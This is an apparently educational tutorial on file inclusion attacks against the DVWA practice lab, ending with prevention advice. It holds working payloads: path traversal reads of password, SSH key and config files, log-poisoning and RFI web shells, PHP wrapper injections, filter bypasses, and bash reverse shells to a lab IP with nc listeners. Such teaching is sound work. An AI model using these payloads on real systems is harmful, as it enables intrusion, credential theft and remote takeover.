# Day 15 — File Inclusion Attacks (LFI & RFI)
### ApexPlanet Internship | Task 3: Web Application Security
**Timeline:** Days 25–36 | **Author:** Professorshubhx

---

## What is File Inclusion

File Inclusion vulnerabilities occur when a web application dynamically includes files based on user-supplied input without proper validation. The application takes a filename or path from the user and includes that file in the page — often to load templates, language files, or modules.

When this input isn't sanitized, an attacker can manipulate it to include files they shouldn't have access to — or even execute remote code.

Two types:
- **LFI (Local File Inclusion)** — include files that already exist on the server
- **RFI (Remote File Inclusion)** — include files from an attacker-controlled remote server

---

## How It Works — The Vulnerable Code

A typical vulnerable PHP application might have this:

```php
// Developer wants to load different page templates
$page = $_GET['page'];
include($page);
```

The URL looks like:

```
http://target.com/index.php?page=about.php
http://target.com/index.php?page=contact.php
```

The developer expects users to pass filenames like `about.php`. But an attacker passes:

```
http://target.com/index.php?page=../../../../etc/passwd
```

The server includes `/etc/passwd` — exposing all system users.

---

## 1. Local File Inclusion (LFI)

LFI lets you read files that exist on the web server — configuration files, password files, logs, SSH keys, anything the web server user has permission to read.

### Setup on DVWA

```
DVWA → File Inclusion
Security level: Low
URL will be: http://192.168.56.104/dvwa/vulnerabilities/fi/?page=include.php
```

### Basic LFI Test

Change the `page` parameter in the URL:

```
http://192.168.56.104/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

If vulnerable, the contents of `/etc/passwd` are displayed in the page:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
...
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
```

This reveals all user accounts on the system. Not passwords (those are in `/etc/shadow`) but usernames, home directories, and shell types.

### Path Traversal — The `../` Technique

`../` means "go up one directory level." Chaining them together lets you navigate from the web root to the filesystem root:

```
/var/www/html/dvwa/vulnerabilities/fi/   ← starting point (web root area)
../                                       ← /var/www/html/dvwa/vulnerabilities/
../../                                    ← /var/www/html/dvwa/
../../../                                 ← /var/www/html/
../../../../                              ← /var/www/
../../../../../                           ← /var/
../../../../../../                        ← /  (filesystem root)
../../../../../../etc/passwd              ← /etc/passwd
```

Use enough `../` sequences to get to root. Using too many doesn't matter — Linux stops at `/`.

### Important Files to Read via LFI

```bash
# User accounts
../../../../../../etc/passwd

# Password hashes (requires root — unlikely but try)
../../../../../../etc/shadow

# SSH private keys (if you know a username)
../../../../../../home/msfadmin/.ssh/id_rsa

# Web server configuration
../../../../../../etc/apache2/apache2.conf
../../../../../../etc/apache2/sites-enabled/000-default.conf

# PHP configuration
../../../../../../etc/php/7.4/apache2/php.ini

# Web application config (database credentials)
../../../../../../var/www/html/dvwa/config/config.inc.php

# System hostname and network info
../../../../../../etc/hostname
../../../../../../etc/hosts
../../../../../../etc/network/interfaces

# Cron jobs (scheduled tasks)
../../../../../../etc/crontab

# Bash history (commands run by users)
../../../../../../home/msfadmin/.bash_history
../../../../../../root/.bash_history

# Apache access logs (useful for log poisoning — see below)
../../../../../../var/log/apache2/access.log
../../../../../../var/log/apache2/error.log

# Linux OS info
../../../../../../etc/os-release
../../../../../../proc/version

# Running processes
../../../../../../proc/self/environ
```

### LFI on DVWA — Read Database Config

```
http://192.168.56.104/dvwa/vulnerabilities/fi/?page=../../config/config.inc.php
```

This reveals the database credentials:

```php
$_DVWA[ 'db_user' ]     = 'root';
$_DVWA[ 'db_password' ] = 'toor';
$_DVWA[ 'db_database' ] = 'dvwa';
```

Database username and password found through LFI.

---

## 2. LFI to RCE — Log Poisoning

Log poisoning is a technique to escalate LFI into Remote Code Execution. It works in two steps:

**Step 1:** Inject PHP code into a log file
**Step 2:** Include that log file via LFI — the server executes the PHP

### Step 1 — Poison the Apache Access Log

Every HTTP request gets logged in `/var/log/apache2/access.log`. The User-Agent header is logged as-is. We can inject PHP code into the User-Agent.

```bash
# Send a request with PHP code in the User-Agent header
curl -A "<?php system(\$_GET['cmd']); ?>" http://192.168.56.104/dvwa/vulnerabilities/fi/
```

The access log now contains:

```
192.168.56.100 - - [10/May/2026] "GET /dvwa/vulnerabilities/fi/ HTTP/1.1" 200 1234
"<?php system($_GET['cmd']); ?>" "-"
```

### Step 2 — Include the Log File via LFI

```
http://192.168.56.104/dvwa/vulnerabilities/fi/?page=../../../../../../var/log/apache2/access.log&cmd=id
```

The server includes the log file, the PHP code in it executes with `cmd=id`, and the output appears in the page:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Remote code execution achieved through LFI + log poisoning.

### More Commands via Log Poisoning

```
# List files
?page=../../../../../../var/log/apache2/access.log&cmd=ls /var/www/html

# Read sensitive file
?page=../../../../../../var/log/apache2/access.log&cmd=cat /etc/passwd

# Get a reverse shell
?page=../../../../../../var/log/apache2/access.log&cmd=bash -c 'bash -i >& /dev/tcp/192.168.56.100/4444 0>&1'
```

Set up listener first:

```bash
nc -lvp 4444
```

---

## 3. PHP Wrappers for LFI

PHP has built-in wrappers that extend what `include()` can do. These are extremely useful when trying to read PHP files (which would normally execute instead of display).

### php://filter — Read PHP Source Code

Without the filter, including a PHP file executes it — you see output, not source code. The filter wrapper encodes the file content before including it, preventing execution:

```
http://192.168.56.104/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php
```

Output is base64-encoded PHP source:

```
PD9waHAKCiMgSWYgeW91IHdhbnQgdG8gc2V0dXAgeW91ciBvd24gZG9tYWluIG5hbWUsIHlvdSB3aWxs...
```

Decode it on Kali:

```bash
echo "PD9waHAK..." | base64 -d
```

Now you can read the PHP source without executing it — useful for finding hardcoded credentials or logic vulnerabilities.

### php://input — Execute POST Data as PHP

```bash
# Send PHP code in POST body, execute via php://input wrapper
curl -s -X POST "http://192.168.56.104/dvwa/vulnerabilities/fi/?page=php://input" \
  --cookie "PHPSESSID=yourid; security=low" \
  -d "<?php system('id'); ?>"
```

### data:// Wrapper

```
http://192.168.56.104/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php system('id'); ?>

# Or base64 encoded
http://192.168.56.104/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

`PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==` is base64 for `<?php system('id'); ?>`

---

## 4. Remote File Inclusion (RFI)

RFI goes further — instead of reading local files, you host a malicious PHP file on your own server and make the target include and execute it.

### Requirements for RFI

```php
# php.ini must have these settings (often disabled by default in modern PHP)
allow_url_fopen = On
allow_url_include = On
```

Check if RFI is possible on DVWA:

```
http://192.168.56.104/dvwa/vulnerabilities/fi/?page=http://192.168.56.100/test.txt
```

If the content of `test.txt` appears — RFI is enabled.

### Step 1 — Create a Malicious PHP Shell on Kali

```bash
# Create a simple web shell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# Or a more complete shell
cat > /var/www/html/shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
EOF

# Start web server on Kali
sudo service apache2 start
```

### Step 2 — Include Shell via RFI

```
http://192.168.56.104/dvwa/vulnerabilities/fi/?page=http://192.168.56.100/shell.php&cmd=id
```

The target fetches your PHP file from Kali, executes it, and returns the output. You now have remote code execution.

### Step 3 — Upgrade to Reverse Shell

```
# In RFI URL:
?page=http://192.168.56.100/shell.php&cmd=bash -c 'bash -i >& /dev/tcp/192.168.56.100/4444 0>&1'

# On Kali — listener ready:
nc -lvp 4444
```

Full interactive shell on the target.

### Using a PHP Reverse Shell

Kali has pre-made reverse shell scripts:

```bash
# Copy the PHP reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php /var/www/html/rshell.php

# Edit it — change IP and port
nano /var/www/html/rshell.php
# Change: $ip = '192.168.56.100';
# Change: $port = 4444;

# Set up listener
nc -lvp 4444

# Trigger via RFI
http://192.168.56.104/dvwa/vulnerabilities/fi/?page=http://192.168.56.100/rshell.php
```

Full reverse shell connection established.

---

## 5. Bypass Techniques

### Null Byte Injection (PHP < 5.3.4)

If the application appends `.php` to your input:

```php
include($_GET['page'] . '.php');
```

Use null byte to terminate the string before `.php` is appended:

```
?page=../../../../../../etc/passwd%00
```

`%00` is the null byte — PHP stops reading the string there. The `.php` gets cut off.

Note: Fixed in PHP 5.3.4+ but still relevant for very old systems.

### Double URL Encoding

If `../` is filtered:

```
Normal:          ../
URL encoded:     %2e%2e%2f
Double encoded:  %252e%252e%252f
```

Some WAFs decode once — double encoding bypasses them.

### Path Truncation

Very long paths can cause PHP to truncate filenames — another old bypass:

```
?page=../../../../../../../etc/passwd/./././././././././././././././
```

### Using Absolute Paths

If `../` is stripped but absolute paths work:

```
?page=/etc/passwd
?page=/var/log/apache2/access.log
```

---

## 6. Prevention

### Whitelist Allowed Files

```php
// Only allow specific known files — reject everything else
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (!in_array($page, $allowed_pages)) {
    die("Invalid page requested");
}

include($page . '.php');
```

### Disable URL Includes (RFI Prevention)

```ini
# In php.ini
allow_url_include = Off    # Prevents RFI entirely
allow_url_fopen = Off      # Prevents URL-based file operations
```

### Remove Path Traversal Characters

```php
// Strip dangerous characters
$page = str_replace('../', '', $_GET['page']);
$page = str_replace('..\\', '', $_GET['page']);
$page = basename($_GET['page']);    // Only take filename, ignore path
```

### Use Realpath and Validate

```php
$base_dir = '/var/www/html/pages/';
$page = realpath($base_dir . $_GET['page']);

// Ensure the resolved path is still inside the allowed directory
if (strpos($page, $base_dir) !== 0) {
    die("Access denied");
}

include($page);
```

`realpath()` resolves `../` sequences to actual paths. Then checking that the result starts with `$base_dir` ensures the file is inside the allowed directory — path traversal is impossible.

### Disable PHP Wrappers

```php
// In php.ini
allow_url_fopen = Off
allow_url_include = Off

// Or in code — use open_basedir restriction
ini_set('open_basedir', '/var/www/html/pages/');
```

`open_basedir` restricts PHP from accessing files outside the specified directory — even if path traversal succeeds, the file read is blocked.

---

## Practice Tasks

1. Go to DVWA File Inclusion on Low — include `/etc/passwd` using path traversal
2. Count how many `../` sequences you need to reach the root — document your finding
3. Read the DVWA database config file via LFI — note the credentials
4. Try reading `/etc/shadow` — does the web server have permission?
5. Read `/home/msfadmin/.bash_history` — what commands has the user run?
6. Attempt log poisoning — inject PHP code into User-Agent using curl, then include the log
7. Use the `php://filter` wrapper to read DVWA's config.inc.php source code as base64 — decode it
8. Test if RFI works — try including `http://192.168.56.100/test.txt` via the page parameter
9. If RFI works — create a web shell on Kali, include it via RFI, execute `whoami` and `id`
10. Set DVWA to High — read the PHP source — identify what protection is implemented and why it works

---

## Quick Reference

```
LFI PAYLOADS                    IMPORTANT FILES
../../../../../../etc/passwd    /etc/passwd        User accounts
../../../../../../etc/shadow    /etc/shadow        Password hashes
?page=/etc/passwd               /var/log/apache2/  Apache logs
                                ~/.ssh/id_rsa      SSH private key
PHP WRAPPERS                    /proc/self/environ Environment vars
php://filter/convert.base64-encode/resource=file
php://input (POST body)         LOG POISONING STEPS
data://text/plain,<?php?>       1. Inject PHP in User-Agent via curl
                                2. Include log file via LFI
RFI ATTACK                      3. Pass cmd parameter
1. Create shell.php on Kali     4. RCE achieved
2. Start Apache: service apache2 start
3. ?page=http://kali-ip/shell.php&cmd=id

PREVENTION
Whitelist allowed pages         realpath() + base_dir check
allow_url_include = Off         open_basedir restriction
basename() to strip paths       Input validation
```

---

## Resources

- OWASP File Inclusion: https://owasp.org/www-project-web-security-testing-guide/
- PayloadsAllTheThings LFI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- PHP Wrappers Reference: https://www.php.net/manual/en/wrappers.php
- PortSwigger Path Traversal Labs: https://portswigger.net/web-security/file-path-traversal
- Defronix Academy | Mentor: Nitesh Singh Sir

---

## Connect

- **LinkedIn:** [Shubham Chaurasiya](https://www.linkedin.com/in/shubham-chaurasiya-60932a359/)
- **TryHackMe:** [professorshubhx](https://tryhackme.com/p/professorshubhx)

---

*Day 15 Complete | Next: Day 16 — Burp Suite Advanced (Login intercept, Intruder fuzzing)*
